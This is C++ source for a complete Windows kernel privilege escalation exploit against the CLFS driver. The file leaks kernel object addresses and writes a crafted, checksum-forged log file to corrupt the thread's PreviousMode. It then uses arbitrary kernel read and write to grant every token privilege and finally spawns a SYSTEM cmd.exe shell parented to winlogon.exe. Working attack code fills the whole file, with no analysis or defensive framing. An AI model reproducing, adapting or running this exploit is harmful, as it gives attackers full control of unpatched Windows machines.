#define UMDF_USING_NTSTATUS

#include <algorithm>
#include <memory>
#include <random>
#include <string>

#include "clfspriv.h"
#include "crc32.h"
#include "ntdll.h"

#include <psapi.h>
#include <tlhelp32.h>

#define LOG_INFO(x) fprintf(stderr, "[*] %s\n", x)
#define LOG_INFO_ADDR(x, p) fprintf(stderr, "[*] %s: %p\n", x, p)
#define LOG_ERROR(x) fprintf(stderr, "[-] %s:%d: %s: %d\n", __FILE__, __LINE__, x, GetLastError())
#define LOG_ERROR_CODE(x, c) fprintf(stderr, "[-] %s:%d: %s: %x\n", __FILE__, __LINE__, x, c)

#define BUFFER_ADDR 0x500000000
#define PREVIOUSMODE_OFFSET 0x232
#define TOKEN_OFFSET 0x4b8

DECLARE_NTDLL_FUNC(NtQuerySystemInformation, (SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation,
                                              ULONG SystemInformationLength, PULONG ReturnLength))
DECLARE_NTDLL_FUNC(NtReadVirtualMemory, (HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
                                         ULONG NumberOfBytesToRead, PULONG NumberOfBytesRead))
DECLARE_NTDLL_FUNC(NtWriteVirtualMemory, (HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
                                          ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten))

static PVOID KThreadAddr;
static PVOID CLFSAddr;
static PVOID ProcessEPROCESS;
static Crc32 crc32(0xedb88320);

template <typename T> struct SystemInformation
{
    NTSTATUS Status;
    std::unique_ptr<UCHAR[]> Buffer;
    SystemInformation(NTSTATUS status, std::unique_ptr<UCHAR[]> &buffer) : Status(status), Buffer(std::move(buffer))
    {
    }
    T *operator()()
    {
        return (T *)Buffer.get();
    }
};

template <typename T>
static SystemInformation<T> QuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass)
{
    for (ULONG size = 1;; size <<= 1)
    {
        auto buf = std::make_unique<UCHAR[]>(size);
        ULONG outSize;
        auto status = NtQuerySystemInformation(SystemInformationClass, buf.get(), size, &outSize);
        if (status == STATUS_INFO_LENGTH_MISMATCH)
            continue;
        if (status != STATUS_SUCCESS)
            buf.reset();
        return SystemInformation<T>(status, buf);
    }
}

static std::wstring GetTmpPath()
{
    WCHAR buf[MAX_PATH];
    GetTempPath2(MAX_PATH, buf);
    return buf;
}

static std::wstring GetRandomFileName(size_t length)
{
    std::random_device rng;
    std::wstring out(length, 0);
    std::generate_n(out.begin(), length, [&rng] {
        static const WCHAR alphanum[] = L"0123456789"
                                        L"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                        L"abcdefghijklmnopqrstuvwxyz";
        return alphanum[rng() % (ARRAYSIZE(alphanum) - 1)];
    });
    return out;
}

static PVOID LeakModuleBase(const char *szPathName)
{
    PVOID pImageBase = NULL;

    auto info = QuerySystemInformation<RTL_PROCESS_MODULES>(SystemModuleInformation);
    if (info.Status != STATUS_SUCCESS)
    {
        LOG_ERROR_CODE("QuerySystemInformation", info.Status);
        return NULL;
    }

    for (ULONG i = 0; i < info()->NumberOfModules; i++)
    {
        if (!_stricmp((char *)info()->Modules[i].FullPathName, szPathName))
        {
            pImageBase = info()->Modules[i].ImageBase;
            break;
        }
    }

    return pImageBase;
}

static PVOID LeakHandleObject(DWORD dwProcessId, HANDLE hHandle)
{
    PVOID pObject = NULL;

    auto info = QuerySystemInformation<SYSTEM_HANDLE_INFORMATION_EX>(SystemExtendedHandleInformation);
    if (info.Status != STATUS_SUCCESS)
    {
        LOG_ERROR_CODE("QuerySystemInformation", info.Status);
        return NULL;
    }

    for (ULONG i = 0; i < info()->HandleCount; i++)
    {
        if (info()->Handles[i].UniqueProcessId == reinterpret_cast<HANDLE>(dwProcessId) &&
            info()->Handles[i].HandleValue == hHandle)
        {
            pObject = info()->Handles[i].Object;
            break;
        }
    }

    return pObject;
}

static int Setup()
{
    PUCHAR Buffer;
    HANDLE hThread;
    HANDLE hProcess;

    LOG_INFO("Retrieving ntdll functions");
    BEGIN_NTDLL_IMPORT();
    NTDLL_IMPORT(NtQuerySystemInformation);
    NTDLL_IMPORT(NtReadVirtualMemory);
    NTDLL_IMPORT(NtWriteVirtualMemory);
    END_NTDLL_IMPORT();

    LOG_INFO("Getting KTHREAD");
    if (!DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &hThread, 0, FALSE,
                         DUPLICATE_SAME_ACCESS))
    {
        LOG_ERROR("DuplicateHandle");
        return -1;
    }
    if ((KThreadAddr = LeakHandleObject(GetCurrentProcessId(), hThread)) == NULL)
    {
        LOG_ERROR("LeakKTHREAD");
        return -1;
    }
    LOG_INFO_ADDR("KTHREAD", KThreadAddr);
    CloseHandle(hThread);

    LOG_INFO("Getting CLFS.SYS");
    if ((CLFSAddr = LeakModuleBase("\\systemroot\\system32\\drivers\\clfs.sys")) == NULL)
    {
        LOG_ERROR("LeakModuleBase");
        return -1;
    }
    LOG_INFO_ADDR("CLFS.SYS", CLFSAddr);

    LOG_INFO("Getting process EPROCESS");
    if (!DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &hProcess, 0, FALSE,
                         DUPLICATE_SAME_ACCESS))
    {
        LOG_ERROR("DuplicateHandle");
        return -1;
    }
    if ((ProcessEPROCESS = LeakHandleObject(GetCurrentProcessId(), hProcess)) == NULL)
    {
        LOG_ERROR("LeakEPROCESS");
        return -1;
    }
    LOG_INFO_ADDR("ProcessEPROCESS", ProcessEPROCESS);
    CloseHandle(hProcess);

    LOG_INFO("Preparing fake container");
    Buffer = (PUCHAR)VirtualAlloc((LPVOID)BUFFER_ADDR, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (Buffer == NULL)
    {
        LOG_ERROR("VirtualAlloc");
        return -1;
    }

    *(ULONG_PTR *)(Buffer) = (ULONG_PTR)Buffer + 0x800;
    *(HANDLE *)(Buffer + 0x20) = INVALID_HANDLE_VALUE;
    *(ULONG_PTR *)(Buffer + 0x30) = (ULONG_PTR)KThreadAddr + PREVIOUSMODE_OFFSET + 0x30;

    HMODULE hClfs = LoadLibrary(L"C:\\Windows\\system32\\drivers\\clfs.sys");
    if (hClfs == NULL)
    {
        LOG_ERROR("LoadLibrary");
        return -1;
    }
    *(ULONG_PTR *)(Buffer + 0x808) =
        (ULONG_PTR)CLFSAddr + ((ULONG_PTR)GetProcAddress(hClfs, "ClfsSetEndOfLog") - (ULONG_PTR)hClfs);
    FreeLibrary(hClfs);

    return 0;
}

static void DecodeBlock(PUCHAR pBlock)
{
    PCLFS_LOG_BLOCK_HEADER pLogBlockHeader = (PCLFS_LOG_BLOCK_HEADER)pBlock;
    PUSHORT pSignatures = (PUSHORT)(pBlock + pLogBlockHeader->SignaturesOffset);

    for (int i = pLogBlockHeader->TotalSectorCount - 1; i >= 0; --i)
        *(PUSHORT)(pBlock + 0x200 * i + 0x1fe) = pSignatures[i];
}

static void EncodeBlock(PUCHAR pBlock)
{
    PCLFS_LOG_BLOCK_HEADER pLogBlockHeader = (PCLFS_LOG_BLOCK_HEADER)pBlock;
    UCHAR cUsn = pLogBlockHeader->Usn;
    UCHAR cParity = 0x10;
    USHORT curParity = cUsn << 8;
    PUSHORT pSignatures = (PUSHORT)(pBlock + pLogBlockHeader->SignaturesOffset);

    for (int i = 0; i < pLogBlockHeader->TotalSectorCount; ++i)
    {
        if (i == 0)
            *(PUCHAR)&curParity = cParity | 0x40;
        else if (i == pLogBlockHeader->TotalSectorCount - 1)
        {
            if (i == 0)
                *(PUCHAR)&curParity = cParity | 0x60;
            else
                *(PUCHAR)&curParity = cParity | 0x20;
        }
        else
            *(PUCHAR)&curParity = cParity;

        pSignatures[i] = *(PUSHORT)(pBlock + 0x200 * i + 0x1fe);
        *(PUSHORT)(pBlock + 0x200 * i + 0x1fe) = curParity;
    }

    pLogBlockHeader->Checksum = 0;
    pLogBlockHeader->Checksum = crc32.Compute((const PUCHAR)pLogBlockHeader, pLogBlockHeader->TotalSectorCount << 9);
}

static BOOL AllocContainer(HANDLE hLogFile, PULONGLONG cbContainer, const std::wstring &path)
{
    struct AllocContainerContext
    {
        ULONGLONG cbContainer;
        USHORT cContainer;
    };

    DWORD sz = sizeof(AllocContainerContext) + 2 * (path.size() + 1);
    auto ptr = std::make_unique<UCHAR[]>(sz);
    AllocContainerContext *ctx = reinterpret_cast<AllocContainerContext *>(ptr.get());
    ctx->cbContainer = *cbContainer;
    ctx->cContainer = 1;
    wcscpy_s(reinterpret_cast<PWCHAR>(ptr.get() + sizeof(AllocContainerContext)), path.size() + 1, path.c_str());

    DWORD bytesReturned;
    return DeviceIoControl(hLogFile, 0x8007A808, ctx, sz, cbContainer, sizeof(ULONGLONG), &bytesReturned, NULL);
}

static BOOL CraftVictimLog(const std::wstring &logFile)
{
    static UCHAR BlfData[0x10000];
    ULONG dwNumberOfBytesRead;
    ULONGLONG cbContainer = 512 * 1024;
    PCLFS_BASE_RECORD_HEADER pBaseRecordHeader;
    PCLFS_LOG_BLOCK_HEADER pLogBlockHeader;
    PCLFS_CONTROL_RECORD pControlRecord;
    PCLFSHASHSYM pHashSymClient, pHashSymContainer;
    PCLFS_CONTAINER_CONTEXT pContainerContext;
    PCLFS_CLIENT_CONTEXT pClientContext;

    LOG_INFO("Creating initial log file");
    HANDLE hLogFile = CreateLogFile((L"LOG:" + logFile).c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0);
    if (hLogFile == INVALID_HANDLE_VALUE)
    {
        LOG_ERROR("CreateLogFile");
        goto err;
    }
    if (!AllocContainer(hLogFile, &cbContainer, CLFS_CONTAINER_RELATIVE_PREFIX + GetRandomFileName(8)))
    {
        LOG_ERROR("AddLogContainer");
        goto err_close;
    }
    CloseHandle(hLogFile);

    LOG_INFO("Patching initial log file");
    hLogFile = CreateFile((logFile + CLFS_BASELOG_EXTENSION).c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL,
                          OPEN_EXISTING, 0, NULL);
    if (hLogFile == INVALID_HANDLE_VALUE)
    {
        LOG_ERROR("CreateFile");
        goto err;
    }
    if (!ReadFile(hLogFile, BlfData, sizeof(BlfData), &dwNumberOfBytesRead, NULL))
    {
        LOG_ERROR("ReadFile");
        goto err_close;
    }
    SetFilePointer(hLogFile, 0, NULL, FILE_BEGIN);

    pLogBlockHeader = (PCLFS_LOG_BLOCK_HEADER)BlfData;
    pControlRecord = (PCLFS_CONTROL_RECORD)((char *)pLogBlockHeader + pLogBlockHeader->RecordOffsets[0]);

    pLogBlockHeader = (PCLFS_LOG_BLOCK_HEADER)(BlfData + pControlRecord->rgBlocks[2].cbOffset);
    pBaseRecordHeader = (PCLFS_BASE_RECORD_HEADER)((char *)pLogBlockHeader + pLogBlockHeader->RecordOffsets[0]);

    DecodeBlock((PUCHAR)pLogBlockHeader);

    pBaseRecordHeader->cbSymbolZone = 0x2000;

    memmove((PUCHAR)pBaseRecordHeader + 0x2010 - 0x30 - 0x30,
            (PUCHAR)pBaseRecordHeader + pBaseRecordHeader->rgClients[0] - 0x30, 0xb8);

    pBaseRecordHeader->rgClients[0] = 0x2010 - 0x30;

    for (int i = 0; i < 11; ++i)
    {
        if (pBaseRecordHeader->rgClientSymTbl[i] == 0x1338)
        {
            pBaseRecordHeader->rgClientSymTbl[i] = 0x2010 - 0x30 - 0x30;
            break;
        }
    }

    pHashSymClient = (PCLFSHASHSYM)((PUCHAR)pBaseRecordHeader + pBaseRecordHeader->rgClients[0] - 0x30);
    pHashSymClient->cbOffset = pBaseRecordHeader->rgClients[0];
    pHashSymClient->cbSymName = pBaseRecordHeader->rgClients[0] + sizeof(CLFS_CLIENT_CONTEXT);

    memmove((PUCHAR)pBaseRecordHeader + pBaseRecordHeader->rgClients[0] + 0x20,
            (PUCHAR)pBaseRecordHeader + pBaseRecordHeader->rgContainers[0] - 0x10, 0x28);

    pHashSymContainer = (PCLFSHASHSYM)((PUCHAR)pBaseRecordHeader + pBaseRecordHeader->rgClients[0]);
    pHashSymContainer->cbOffset = 0x2010;
    pHashSymContainer->cbSymName = 0x2010 + sizeof(CLFS_CONTAINER_CONTEXT);

    pContainerContext = (PCLFS_CONTAINER_CONTEXT)((PUCHAR)pBaseRecordHeader + 0x2010);
    pContainerContext->pContainer = (PVOID)BUFFER_ADDR;

    memmove((PUCHAR)pBaseRecordHeader + 0x66, (PUCHAR)pBaseRecordHeader,
            sizeof(CLFS_BASE_RECORD_HEADER) + pBaseRecordHeader->cbSymbolZone);

    pLogBlockHeader->RecordOffsets[0] += 0x66;
    pLogBlockHeader->Usn = 0x20;

    // time fo forge
    pBaseRecordHeader = (PCLFS_BASE_RECORD_HEADER)((char *)pLogBlockHeader + pLogBlockHeader->RecordOffsets[0]);
    pBaseRecordHeader->hdrBaseRecord.ullDumpCount = 0x1338;

    pClientContext = reinterpret_cast<PCLFS_CLIENT_CONTEXT>(reinterpret_cast<PUCHAR>(pBaseRecordHeader) +
                                                            pBaseRecordHeader->rgClients[0]);
    pClientContext->fAttributes |= FILE_ATTRIBUTE_ARCHIVE;
    pClientContext->lsnArchiveTail = pClientContext->lsnLast = pClientContext->lsnBase;

    EncodeBlock((PUCHAR)pLogBlockHeader);

    pLogBlockHeader->Checksum = 0;
    crc32.Forge(0xffffffff, (PUCHAR)pLogBlockHeader, pLogBlockHeader->TotalSectorCount << 9, 0x7800);

    // revert
    DecodeBlock((PUCHAR)pLogBlockHeader);

    pBaseRecordHeader->hdrBaseRecord.ullDumpCount = 0x1337;

    pClientContext->fAttributes &= ~FILE_ATTRIBUTE_ARCHIVE;
    pClientContext->lsnArchiveTail.Internal = pClientContext->lsnLast.Internal = 0;

    EncodeBlock((PUCHAR)pLogBlockHeader);

    if (!WriteFile(hLogFile, BlfData, sizeof(BlfData), &dwNumberOfBytesRead, NULL))
    {
        LOG_ERROR("WriteFile");
        goto err_close;
    }
    CloseHandle(hLogFile);

    return TRUE;

err_close:
    CloseHandle(hLogFile);
err:
    return FALSE;
}

static void SpawnShell()
{
    PROCESSENTRY32 entry;
    HANDLE snapshot;

    entry.dwSize = sizeof(PROCESSENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    INT pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    LOG_INFO("Spawning shell");

    HANDLE hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hWinLogon == INVALID_HANDLE_VALUE)
    {
        LOG_ERROR("OpenProcess");
        return;
    }

    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    SIZE_T size;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    auto xxx = std::make_unique<UCHAR[]>(size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)xxx.get();
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hWinLogon, sizeof(HANDLE),
                              NULL, NULL);

    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    wchar_t cmdline[MAX_PATH];
    wcscpy_s(cmdline, L"cmd.exe");

    if (!CreateProcess(NULL, cmdline, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL,
                       L"C:\\", reinterpret_cast<LPSTARTUPINFO>(&si), &pi))
        LOG_ERROR("CreateProcess");
}

static void Exploit()
{
    HANDLE hLogFile;
    DWORD dwNumberOfBytesRead;
    ULONG_PTR Token;
    NTSTATUS status;
    std::wstring logFile = GetTmpPath() + GetRandomFileName(8);

    if (!CraftVictimLog(logFile))
    {
        LOG_ERROR("CraftVictimLog");
        return;
    }
    LOG_INFO("Open log file");
    hLogFile = CreateLogFile((L"LOG:" + logFile).c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0);
    if (hLogFile == INVALID_HANDLE_VALUE)
    {
        LOG_ERROR("CreateLogFile");
        return;
    }
    LOG_INFO("Enable archive");
    if (!SetLogArchiveMode(hLogFile, ClfsLogArchiveEnabled))
    {
        LOG_ERROR("SetLogArchiveMode");
        CloseHandle(hLogFile);
        return;
    }
    LOG_INFO("Disable archive");
    SetLogArchiveMode(hLogFile, ClfsLogArchiveDisabled);
    CloseHandle(hLogFile);

    LOG_INFO("Getting current process token");
    if ((status = NtReadVirtualMemory(GetCurrentProcess(), (PVOID)((ULONG_PTR)ProcessEPROCESS + TOKEN_OFFSET), &Token,
                                      sizeof(Token), &dwNumberOfBytesRead)) != STATUS_SUCCESS)
    {
        LOG_ERROR_CODE("NtReadVirtualMemory", status);
        return;
    }
    Token &= 0xfffffffffffffff0;
    LOG_INFO_ADDR("Token", Token);

    ULONGLONG x[3];
    x[0] = x[1] = x[2] = 0xffffffffc;

    LOG_INFO("Enabling all privileges");
    if ((status = NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)(Token + 0x40), x, sizeof(x),
                                       &dwNumberOfBytesRead)) != STATUS_SUCCESS)
    {
        LOG_ERROR_CODE("NtWriteVirtualMemory", status);
        return;
    }

    LOG_INFO("Cleaning up");

    dwNumberOfBytesRead = 1;
    if ((status = NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)((ULONG_PTR)KThreadAddr + PREVIOUSMODE_OFFSET),
                                       &dwNumberOfBytesRead, sizeof(dwNumberOfBytesRead), &dwNumberOfBytesRead)) !=
        STATUS_SUCCESS)
        LOG_ERROR_CODE("NtWriteVirtualMemory", status);

    SpawnShell();
}

int main()
{
    if (!Setup())
        Exploit();
}